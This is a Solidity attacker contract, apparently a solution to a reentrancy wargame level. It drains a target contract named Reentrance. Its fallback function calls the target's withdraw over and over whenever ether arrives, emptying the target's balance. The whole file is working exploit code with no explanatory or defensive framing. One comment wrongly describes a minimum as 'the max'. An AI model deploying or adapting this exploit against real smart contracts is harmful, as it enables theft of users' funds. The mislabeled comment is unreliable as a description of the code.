// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceAttacker {
    Reentrance reentranceContract;
    address payable public owner;

    constructor(address payable _reentranceContract) public payable {
        owner = msg.sender;
        reentranceContract = Reentrance(_reentranceContract);
    }

    function withdraw() external {
        require(msg.sender == owner);
        uint256 balance = reentranceContract.balanceOf(address(this));
        reentranceContract.withdraw(balance);
    }

    // fallback function
    fallback() external payable {
        uint256 donated_balance = reentranceContract.balanceOf(address(this));
        uint256 contract_balance = address(reentranceContract).balance;

        // withdraw the max between the donated_balance and the total value on the Reentrance contract
        uint256 withdraw_amount = donated_balance;
        if (contract_balance < donated_balance) {
            withdraw_amount = contract_balance;
        }

        if (contract_balance > 0) {
            reentranceContract.withdraw(withdraw_amount);
        }
    }
}
